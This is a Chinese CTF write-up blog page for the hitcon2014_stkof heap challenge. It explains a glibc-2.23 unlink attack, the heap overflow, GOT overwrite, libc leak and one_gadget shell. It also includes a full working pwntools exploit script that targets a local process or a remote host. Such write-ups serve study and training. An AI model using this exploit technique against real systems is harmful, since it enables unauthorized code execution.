@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>hitcon2014_stkof - Limu&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Unlink机制研究分析题目首先题目是一个使用libc-2.23.so的64位程序，程序没有开启GOT表的保护，修改加载的ld和libc后，试着运行程序，但是无显示，通过源码大致判断了下程序功能，是一个经典的堆选项的题目。      在向chunk写入的函数中我们可以看到，存在任意长度写入的问题，我们可以任意写入内容溢出至下一个chunk。   基本思路程序在最开始的时候没有设置IO缓冲区，所以会">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon2014_stkof">
+<meta property="og:url" content="https://limu.ltd/2023/03/16/hitcon2014-stkof/index.html">
+<meta property="og:site_name" content="Limu&#39;s Blog">
+<meta property="og:description" content="Unlink机制研究分析题目首先题目是一个使用libc-2.23.so的64位程序，程序没有开启GOT表的保护，修改加载的ld和libc后，试着运行程序，但是无显示，通过源码大致判断了下程序功能，是一个经典的堆选项的题目。      在向chunk写入的函数中我们可以看到，存在任意长度写入的问题，我们可以任意写入内容溢出至下一个chunk。   基本思路程序在最开始的时候没有设置IO缓冲区，所以会">
+<meta property="og:locale">
+<meta property="og:image" content="https://limu.ltd/images/hitcon2014_stkof/1.png">
+<meta property="article:published_time" content="2023-03-16T07:26:02.000Z">
+<meta property="article:modified_time" content="2023-03-27T03:06:34.000Z">
+<meta property="article:author" content="Limu">
+<meta property="article:tag" content="CTF刷题记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://limu.ltd/images/hitcon2014_stkof/1.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1685348109768">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1685348109768">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1685348109768">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(/images/1.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="Limu" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Limu">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu" alt="Limu">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>3</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/50648378"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/limu520/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 20px;">CTF刷题记录</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/%E6%9D%82%E8%AE%B0/" style="font-size: 10px;">杂记</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(3);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">10</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/29/SWPUCTF-2019/">SWPUCTF_2019</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/19/qemu-iot/">Qemu-mips环境配置</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/zctf-2016-note3/">zctf_2016_note3</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/09/hitcon-2018-children-tcache/">hitcon_2018_children_tcache</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/07/lctf-2016/">lctf_2016</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 Limu
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <a href=”http://www.beian.miit.gov.cn”>鲁ICP备2022012729号</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="/images/hitcon2014_stkof/0.jpg" alt="hitcon2014_stkof" loading="lazy">
+            <h1>hitcon2014_stkof</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年03月16日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Unlink机制研究"><a href="#Unlink机制研究" class="headerlink" title="Unlink机制研究"></a>Unlink机制研究</h1><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>首先题目是一个使用libc-2.23.so的64位程序，程序没有开启GOT表的保护，修改加载的ld和libc后，试着运行程序，但是无显示，通过源码大致判断了下程序功能，是一个经典的堆选项的题目。  </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/hitcon2014_stkof/1.png" alt="sktof基本情况" data-caption="sktof基本情况" loading="lazy">  </p>
+<p>在向chunk写入的函数中我们可以看到，存在任意长度写入的问题，我们可以任意写入内容溢出至下一个chunk。  </p>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>程序在最开始的时候没有设置IO缓冲区，所以会在第一个chunk前后申请两个chunk作为缓冲区，我们可以申请一个先堆快，释放两个缓冲区的内容。  </p>
+<p>在程序中，存在一个全局变量在0x00602140，储存了所有申请chunk的data区域的地址，如果可以在这个位置伪造一个fake_chunk，我们就可以得到一个可以自由控制的指针，改变程序的运行。  </p>
+<p>然后，我们可以通过改变free函数的got表的内容，泄露puts函数的地址，得到libc的基地址，然后改写free函数plt表的内容为one_gadget,从而获取shell。</p>
+<h2 id="出现的问题以及解决方案"><a href="#出现的问题以及解决方案" class="headerlink" title="出现的问题以及解决方案"></a>出现的问题以及解决方案</h2><p>1、程序输入满字节的情况下，会出现先显示OK后接连打出一个FAIL的内容，但是不影响整体的程序进程，在接收puts泄露出的函数地址时，应该recvuntil到”FAIL\n”的位置，这样才能得到真正的puts的地址。</p>
+<p>2、关于unlink机制：</p>
+<p>利用条件: 存在UAF  </p>
+<p>unlink源码（向后合并触发）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* consolidate backward */</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然，对于最开始的unlink机制，是不存在校验的问题，可以通过定义bck，fwd的内容进行任意的修改，现在的unlink机制，加入了校验的内容，源码是：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line"></span><br><span class="line">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure>
+
+<p>所以这样的话，我们是没有办法直接去做任意的修改，但是我们依旧可以通过控制fd和bk的值，修改特定位置的内容，控制某个指针，来实现后续的操作。  </p>
+<p>利用方式：（1）申请两个chunk，修改第一个chunk的内容为：0x0，伪造本chunk的大小(一般是本chunk-0x10)，fd（chunklist+0x18-0x18），bk（chunklist+0x18-0x10），pattern_code，pre_size（伪造本chunk的大小-1，去掉pre_inuse值） , 下一个chunk的size-1（即修改pre_inuse值为0）。  </p>
+<p>（2）free第二个chunk，触发unlink，可以修改在chunklist的位置修改成fd的内容，然后可以利用edit一类的函数，对任意的地址进行修改。  </p>
+<h2 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">##Author by: limu</span><br><span class="line">##Terminal: i3</span><br><span class="line">##Tools: pwntools</span><br><span class="line">##Usage: python3 exp.py [local or remote] [yes or no] ip port</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#from pwnlib import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;i3-sensible-terminal&#x27;,&quot;-e&quot;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &#x27;l&#x27;:</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line">    </span><br><span class="line">elif sys.argv[1] == &#x27;r&#x27;:</span><br><span class="line">    p = remote(sys.argv[3],sys.argv[4])</span><br><span class="line">    </span><br><span class="line">else: </span><br><span class="line">    print(&quot;wrong&quot;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">##启动调试</span><br><span class="line">if sys.argv[2] == &#x27;y&#x27;:</span><br><span class="line">    gdb.attach(p,gdbscript=&#x27;break main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    p.sendline(b&#x27;1&#x27;)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line">def fill(index,content):</span><br><span class="line">    p.sendline(b&#x27;2&#x27;)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.sendline(str(len(content)).encode())</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line">    </span><br><span class="line">def free(index):</span><br><span class="line">    p.sendline(b&#x27;3&#x27;)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">    p.sendline(b&#x27;4&#x27;)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line">head_addr = 0x00602140</span><br><span class="line">add(0x100)</span><br><span class="line">add(0x30)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line"></span><br><span class="line">payload = p64(0x0)+p64(0x30)+p64(head_addr-0x8)+p64(head_addr)+p64(0x0)+p64(0x0)+p64(0x30)+p64(0x90)</span><br><span class="line">fill(2,payload)</span><br><span class="line">free(3)</span><br><span class="line">p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0x0) * 2 + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;puts&#x27;])</span><br><span class="line">fill(2,payload2)</span><br><span class="line">payload3 = p64(elf.plt[&#x27;puts&#x27;])</span><br><span class="line">fill(1,payload3)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;FAIL\n&#x27;)</span><br><span class="line">puts_addr = p.recvuntil(b&#x27;OK\n&#x27;, drop=True).ljust(8, b&#x27;\x00&#x27;)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line">base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">one = base + 0xf0897</span><br><span class="line"></span><br><span class="line">fill(1,p64(one))</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>Limu<br>
+        <strong>Link：</strong><a href="https://limu.ltd/2023/03/16/hitcon2014-stkof/" title="https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;16&#x2F;hitcon2014-stkof&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;16&#x2F;hitcon2014-stkof&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">CTF刷题记录</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink%E6%9C%BA%E5%88%B6%E7%A0%94%E7%A9%B6"><span class="toc-number">1.</span> <span class="toc-text">Unlink机制研究</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">分析题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.</span> <span class="toc-text">出现的问题以及解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88exp"><span class="toc-number">1.4.</span> <span class="toc-text">最终exp</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1685348109773"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
